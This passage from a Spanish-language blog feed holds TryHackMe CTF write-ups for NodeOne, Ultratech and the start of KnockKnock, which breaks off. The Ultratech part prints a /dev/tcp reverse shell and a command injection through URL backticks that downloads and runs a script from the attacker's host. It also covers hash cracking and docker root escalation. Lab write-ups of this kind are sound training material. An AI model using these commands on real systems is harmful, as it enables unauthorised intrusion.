&lt;p&gt;Despues de 30 segundos se ejecuta nuestra shell inversa y obtenemos una shell con el usuario tom y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_020718.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Vemos la version del kernel y buscamos la misma en searchsploit, vemos que existe un exploit que nos puede ayudar a escalar privilegios.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_021149.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/44298&#34;&gt;&lt;strong&gt;CVE-2017-16995&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Lo compilamos, descargamos en la maquina, le damos permisos de ejecucion, lo ejecutamos y obtenemos una shell con usuario root y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_021318.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/nodeone/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/nodeone/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Ultratech</title>
        <link>https://sckull.github.io/posts/ultratech/</link>
        <pubDate>Wed, 26 Feb 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Wed, 26 Feb 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/ultratech/</guid>
        <description>Ultratech es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Ultratech es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/ultratech/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Ultratech&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;2018&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/lp1&#34;&gt;lp1&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue Feb 25 22:11:48 2020 as: nmap -p- -T4 -sV -o nmap_scan 10.10.223.47&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.223.47
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.18s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65531&lt;/span&gt; closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
8081/tcp  open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
Service Info: OSs: Unix, Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Feb 25 22:36:00 2020 -- 1 IP address (1 host up) scanned in 1451.43 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;wfuzz---puerto-8081&#34;&gt;WFUZZ - Puerto 8081&lt;/h3&gt;
&lt;p&gt;Utilizamos WFUZZ para encontrar directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/ultratech# wfuzz -w /usr/share/wordlists/dirb/common_nofirst10.txt -u http://10.10.223.47:8081/FUZZ --sc &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s documentation &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; more information.

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.223.47:8081/FUZZ
Total requests: &lt;span class=&#34;nv&#34;&gt;4586&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;===================================================================&lt;/span&gt;
ID           Response   Lines    Word     Chars       &lt;span class=&#34;nv&#34;&gt;Payload&lt;/span&gt;                                                                             
&lt;span class=&#34;o&#34;&gt;===================================================================&lt;/span&gt;

000000001:   &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; L      &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; W      &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; Ch       &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;                                                                                  
000000487:   &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; L      &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; W      &lt;span class=&#34;m&#34;&gt;39&lt;/span&gt; Ch       &lt;span class=&#34;s2&#34;&gt;&amp;#34;auth&amp;#34;&lt;/span&gt;                                                                              

Total time: 429.3228
Processed Requests: &lt;span class=&#34;m&#34;&gt;4586&lt;/span&gt;
Filtered Requests: &lt;span class=&#34;m&#34;&gt;4584&lt;/span&gt;
Requests/sec.: 10.68193
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;gobuster---puerto-31331&#34;&gt;GOBUSTER - Puerto 31331&lt;/h3&gt;
&lt;p&gt;Ya que en este puerto esta corriendo el servicio de APACHE utilizamos gobuster para encontrar directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/ultratech# gobuster dir -u http://10.10.223.47:31331 -w /usr/share/wordlists/dirb/common_nofirst10.txt -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -x php,html,txt -q
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/favicon.ico &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/javascript &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/js &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/partners.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/what.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
root@aoiri:~/tryhackme/ultratech#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;www---shell&#34;&gt;WWW - Shell&lt;/h2&gt;
&lt;p&gt;Enumeramos las paginas que encontramos en el puerto 31331 y al visitar &lt;strong&gt;partners.html&lt;/strong&gt; encontramos una panel de inicio de sesion.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ultratech/Screenshot_20200225_235726.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Analizamos el codigo fuente y encontramos un archivo de javascript en el que nos muestra una ruta nueva con su parametro de la API que esta corriendo en el servicio de &lt;strong&gt;Node.js&lt;/strong&gt; en el puerto &lt;strong&gt;8081&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ultratech/Screenshot_20200225_235906.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el parametro ingresamos nuestra IP, y ejecutamos tcpdump para capturar paquetes ICMP.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ultratech/Screenshot_20200226_000022.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos que la maquina nos hace ping. Utilizamos &amp;ldquo;Command Injection&amp;rdquo; para poder ejecutar comandos, utilizamos &lt;strong&gt;`&lt;/strong&gt; (acento grave | codigo ascii 96) para &amp;ldquo;escapar&amp;rdquo; la ejecucion del comando ping. Creamos un archivo bash en el que escribimos nuestra shell inversa, en la ruta de la API ejecutamos comandos para: descargar el archivo y ejecutar el archivo.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;shell.sh:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;bash -i &amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; /dev/tcp/10.8.1.72/4242 0&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Commandos:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Primer comando&lt;/span&gt;
wget 10.8.1.72/shell.sh -o shell.sh

&lt;span class=&#34;c1&#34;&gt;#Segundo Comando&lt;/span&gt;
bash shell.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ejecutamos los comandos como parametro en la URL:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;view-source:http://10.10.223.47:8081/ping?ip=`wget 10.8.1.72/shell.sh -o shell.sh`
view-source:http://10.10.223.47:8081/ping?ip=`bash shell.sh`
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Una vez hecho esto, logramos obtener una shell con el usuario www:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ultratech/Screenshot_20200226_000553.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection&#34;&gt;&lt;strong&gt;Command Injection&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---r00t&#34;&gt;USER - r00t&lt;/h2&gt;
&lt;p&gt;Dentro de los archivos de la maquina encontramos una base de datos, la pasamos a nuestra maquina para poder ver los datos que tiene.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ultratech/Screenshot_20200226_000832.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En la base de datos encontramos la tabla de &amp;lsquo;users&amp;rsquo; en donde encontramos dos usuarios y su contraseña encriptada:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ultratech/Screenshot_20200226_000859.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos crackstation para crackear las hashes:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ultratech/Screenshot_20200226_001026.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos que los usuarios registrados en la maquina aparece r00t utilizamos la contraseña crackeada y logramos obtener una shell con este usuario.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ultratech/Screenshot_20200226_001300.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;ftp-ssh&#34;&gt;FTP-SSH&lt;/h3&gt;
&lt;p&gt;De igual forma con las credenciales de r00t podemos ingresar al servicio de FTP y SSH.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ultratech/Screenshot_20200226_001550.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Una pequeña enumeracion basta para poder tener la idea de lo que debemos de hacer, en este caso encontramos que el usuario r00t pertenece al grupo de docker. Utilizamos docker para obtener una shell con el usuario root.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ultratech/Screenshot_20200226_004109.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://gtfobins.github.io/gtfobins/docker/&#34;&gt;&lt;strong&gt;Docker GTFOBINS&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/ultratech/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/ultratech/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - KnockKnock</title>
        <link>https://sckull.github.io/posts/knockknock/</link>
        <pubDate>Mon, 24 Feb 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Mon, 24 Feb 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/knockknock/</guid>
        <description>KnockKnock es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;KnockKnock es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/knockknock/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;KnockKnock&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Knock knock, who&amp;rsquo;s there? Pcaps &amp;amp; port knocking&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;3100&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/ben&#34;&gt;ben&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (80) abierto.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Mon Feb 24 16:44:16 2020 as: nmap -p- -T4 -sV -sC -o nmap_scan 10.10.220.35&lt;/span&gt;
Warning: 10.10.220.35 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;6&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.220.35
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65534&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.7 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Site doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;text/html&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Feb 24 17:02:22 2020 -- 1 IP address (1 host up) scanned in 1085.70 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En la pagina principal nos muestra un mensaje junto con un enlace que nos redirige hacia un archivo &lt;strong&gt;PCAP&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/knockknock/Screenshot_20200224_165413.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;knock&#34;&gt;Knock&lt;/h2&gt;
&lt;p&gt;Vemos que la IP (&lt;strong&gt;192.168.56.102&lt;/strong&gt;) esta realizando solicitudes a la IP2 (&lt;strong&gt;192.168.56.101&lt;/strong&gt;) utilizando los puertos &lt;code&gt;7000, 8000, 9000, 7000, 8000, 9000, 8888&lt;/code&gt;. Utilizamos knockd utilizando los puertos que encontramos y realizamos un escaneo de puertos con nmap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
